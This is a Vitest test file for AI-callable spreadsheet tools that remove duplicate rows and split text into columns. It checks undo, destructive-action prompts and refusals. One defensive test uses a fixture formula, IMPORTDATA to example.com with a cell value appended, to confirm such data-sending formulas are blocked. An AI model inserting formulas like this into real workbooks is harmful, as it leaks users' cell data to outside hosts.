import { describe, expect, it, vi } from 'vitest';
import { Workbook } from '../src/core/workbook.js';
import { runTool, describeCall, callTarget, TOOLS, changesWorkbook } from '../src/core/aitools.js';

function setup(rows) {
  const wb = new Workbook();
  const id = wb.activeSheetId;
  const env = { sheetId: () => id, selection: () => ({ sheetId: id, range: { r1: 0, c1: 0, r2: 0, c2: 0 } }), distrust: vi.fn(), select: vi.fn(() => true) };
  const run = (name, args) => runTool(wb, name, args, env);
  if (rows) run('write_cells', { start_cell: 'A1', values: rows });
  wb.clearHistory();
  return { wb, id, env, run, describe: (name, args) => describeCall(wb, name, args, env) };
}

const column = (wb, id, c, n) => Array.from({ length: n }, (_, r) => wb.getValue(id, r, c) ?? null);

describe('remove_duplicates', () => {
  const people = [['Name', 'City', 'Amount'], ['Ann', 'Oslo', 10], ['Bob', 'Rome', 20], ['ann', 'oslo', 10], ['Cy', 'Oslo', 30], ['Bob', 'Rome', 25]];

  it('is described as a tool that changes the workbook', () => {
    const tool = TOOLS.find((t) => t.function.name === 'remove_duplicates');
    expect(tool.function.parameters.required).toEqual(['range']);
    expect(changesWorkbook('remove_duplicates')).toBe(true);
  });

  it('removes rows that repeat an earlier one, keeps the header, and says how many go and stay', () => {
    const { wb, id, run } = setup(people);
    const res = run('remove_duplicates', { range: 'A1:C6' });
    expect(res.ok).toBe(true);
    const out = JSON.parse(res.content);
    expect(out).toMatchObject({ removed_rows: 1, remaining_rows: 4, header_kept: true, compared_columns: ['A', 'B', 'C'] });
    expect(column(wb, id, 0, 6)).toEqual(['Name', 'Ann', 'Bob', 'Cy', 'Bob', null]);
    expect(wb.undoLabels()).toHaveLength(1);
    wb.undo();
    expect(column(wb, id, 0, 6)).toEqual(['Name', 'Ann', 'Bob', 'ann', 'Cy', 'Bob']);
  });

  it('compares only the columns asked for', () => {
    const { wb, id, run } = setup(people);
    const out = JSON.parse(run('remove_duplicates', { range: 'A1:C6', columns: ['a', 'B'] }).content);
    expect(out.removed_rows).toBe(2);
    expect(column(wb, id, 0, 6)).toEqual(['Name', 'Ann', 'Bob', 'Cy', null, null]);
    expect(column(wb, id, 2, 4)).toEqual(['Amount', 10, 20, 30]);
  });

  it('reads whole columns as their data, and the header from it', () => {
    const { wb, id, run } = setup([[null], [null], ...people]);
    const out = JSON.parse(run('remove_duplicates', { range: 'A:C' }).content);
    expect(out.range).toBe('Sheet1!A3:C8');
    expect(out.removed_rows).toBe(1);
    expect(wb.getValue(id, 2, 0)).toBe('Name');
  });

  it('asks before taking rows away, with the count the runner then removes', () => {
    const { run, describe } = setup(people);
    const d = describe('remove_duplicates', { range: 'A1:C6', columns: ['A', 'B'] });
    expect(d).toMatchObject({ label: 'Remove duplicate rows from Sheet1!A1:C6', destructive: true });
    expect(d.detail).toBe('Deletes 2 rows that repeat an earlier row; 3 rows stay.');
    expect(JSON.parse(run('remove_duplicates', { range: 'A1:C6', columns: ['A', 'B'] }).content).removed_rows).toBe(2);
  });

  it('says when there are no duplicates, and does not ask', () => {
    const { run, describe } = setup([['x', 1], ['y', 2]]);
    expect(describe('remove_duplicates', { range: 'A1:B2', has_header: false }).destructive).toBe(false);
    const res = run('remove_duplicates', { range: 'A1:B2', has_header: false });
    expect(res.ok).toBe(true);
    expect(res.changed).toBe(false);
    expect(res.content).toContain('No duplicate rows were found.');
  });

  it('takes a table\'s rows out of the table', () => {
    const { wb, id, run } = setup(people);
    wb.addTable(id, { r1: 0, c1: 0, r2: 5, c2: 2 }, { name: 'People' });
    const out = JSON.parse(run('remove_duplicates', { range: 'People' }).content);
    expect(out.removed_rows).toBe(1);
    expect(wb.tableByName('People').table.range).toMatchObject({ r1: 0, r2: 4 });
  });

  it('refuses columns outside the range and a protected sheet', () => {
    const { wb, id, run } = setup(people);
    expect(run('remove_duplicates', { range: 'A1:B6', columns: ['C'] }).content).toMatch(/Column C is outside A1:B6/);
    wb.setSheetProtected(id, true);
    const res = run('remove_duplicates', { range: 'A1:C6' });
    expect(res.ok).toBe(false);
    expect(res.content).toMatch(/protected/);
    expect(column(wb, id, 0, 6)).toEqual(['Name', 'Ann', 'Bob', 'ann', 'Cy', 'Bob']);
  });

  it('refuses rows that cannot move, and changes nothing', () => {
    const { wb, id, run } = setup(people);
    wb.mergeCells(id, { r1: 2, c1: 0, r2: 2, c2: 1 });
    const res = run('remove_duplicates', { range: 'A1:C6' });
    expect(res.ok).toBe(false);
    expect(res.content).toMatch(/merged cells/);
    expect(wb.getValue(id, 3, 0)).toBe('ann');
  });
});

describe('split_text_to_columns', () => {
  it('splits by a detected separator over the text and into the columns to its right', () => {
    const { wb, id, run } = setup([['Smith, John, 42'], ['Doe, Jane, 37']]);
    const res = run('split_text_to_columns', { range: 'A1:A2' });
    expect(res.ok).toBe(true);
    expect(JSON.parse(res.content)).toMatchObject({ cells_split: 2, columns: 3, written: 'Sheet1!A1:C2' });
    expect([wb.getValue(id, 0, 0), wb.getValue(id, 0, 1), wb.getValue(id, 0, 2)]).toEqual(['Smith', 'John', 42]);
    expect(wb.undoLabels()).toHaveLength(1);
    wb.undo();
    expect(wb.getValue(id, 0, 0)).toBe('Smith, John, 42');
    expect(wb.getCell(id, 0, 1)).toBeFalsy();
  });

  it('takes the separators, the quote, repeated separators and per-piece formats', () => {
    const { wb, id, run } = setup([['"a;b";;007;x']]);
    run('split_text_to_columns', { range: 'A1', delimiters: [';'], consecutive_as_one: true, piece_formats: ['general', 'text', 'skip'] });
    expect([wb.getValue(id, 0, 0), wb.getValue(id, 0, 1), wb.getCell(id, 0, 2)]).toEqual(['a;b', '007', undefined]);
  });

  it('cuts at fixed widths, into a destination, leaving the text as it is', () => {
    const { wb, id, run } = setup([[20240115], [20231231]]);
    const res = run('split_text_to_columns', { range: 'A1:A2', fixed_widths: [4, 6], destination: 'C1' });
    expect(JSON.parse(res.content).written).toBe('Sheet1!C1:E2');
    expect([wb.getValue(id, 0, 2), wb.getValue(id, 0, 3), wb.getValue(id, 0, 4)]).toEqual([2024, 1, 15]);
    expect(wb.getValue(id, 1, 0)).toBe(20231231);
  });

  it('asks before writing over cells that hold data, counting as the split writes', () => {
    const { describe } = setup([['a,b,c', 'keep', null], ['d,e', null, 'also']]);
    const d = describe('split_text_to_columns', { range: 'A1:A2' });
    expect(d).toMatchObject({ label: 'Split the text in Sheet1!A1:A2 into columns', destructive: true });
    expect(d.detail).toBe('Replaces 1 cell that already holds data.');
    const { describe: clean } = setup([['a,b'], ['c,d']]);
    expect(clean('split_text_to_columns', { range: 'A1:A2' }).destructive).toBe(false);
  });

  it('passes over rows a filter hides, as the split command does', () => {
    const { wb, id, run } = setup([['Name'], ['a,1'], ['b,2'], ['c,3']]);
    wb.sheet(id).filterHidden.add(2);
    run('split_text_to_columns', { range: 'A2:A4' });
    expect(wb.getValue(id, 1, 0)).toBe('a');
    expect(wb.getValue(id, 2, 0)).toBe('b,2');
    expect(wb.getValue(id, 3, 1)).toBe(3);
  });

  it('refuses more than one column, text with no separator, merged and protected cells, writing nothing', () => {
    const { wb, id, run } = setup([['a,b', 'x'], ['plain', null]]);
    expect(run('split_text_to_columns', { range: 'A1:B2' }).content).toMatch(/one column at a time/);
    expect(run('split_text_to_columns', { range: 'A2' }).content).toMatch(/nothing was split/);
    wb.mergeCells(id, { r1: 0, c1: 1, r2: 0, c2: 2 });
    const merged = run('split_text_to_columns', { range: 'A1', delimiters: [','], destination: 'C1' });
    expect(merged.content).toMatch(/inside a merged cell/);
    wb.protectRange(id, { r1: 0, c1: 5, r2: 0, c2: 5 });
    expect(run('split_text_to_columns', { range: 'A1', delimiters: [','], destination: 'E1' }).content).toMatch(/protected range/);
    expect(wb.getValue(id, 0, 0)).toBe('a,b');
    expect(wb.undoLabels()).toEqual(['Protect range', 'Merge cells']);
  });

  it('blocks a piece that becomes a formula reaching outside the workbook, as a typed one is', () => {
    const { wb, id, env, run } = setup([['x;=IMPORTDATA("https://example.com/?"&B5)'], ['y;2']]);
    expect(env.distrust).not.toHaveBeenCalled();
    const out = JSON.parse(run('split_text_to_columns', { range: 'A1:A2', delimiters: [';'] }).content);
    expect(wb.getCell(id, 0, 1).f).toMatch(/^IMPORTDATA/);
    expect(env.distrust).toHaveBeenCalled();
    expect(out.blocked_note).toMatch(/#BLOCKED!/);
    const { env: plain, run: runPlain } = setup([['a;=1+2']]);
    runPlain('split_text_to_columns', { range: 'A1', delimiters: [';'] });
    expect(plain.distrust).not.toHaveBeenCalled();
  });

  it('refuses a destination on another sheet', () => {
    const { wb, run } = setup([['a,b']]);
    wb.addSheet('Other');
    expect(run('split_text_to_columns', { range: 'Sheet1!A1', destination: 'Other!A1' }).content).toMatch(/same sheet/);
  });

  it('targets the text it splits', () => {
    const { wb, env } = setup([['a,b']]);
    expect(callTarget(wb, 'split_text_to_columns', { range: 'A1' }, env).range).toEqual({ r1: 0, c1: 0, r2: 0, c2: 0 });
  });
});
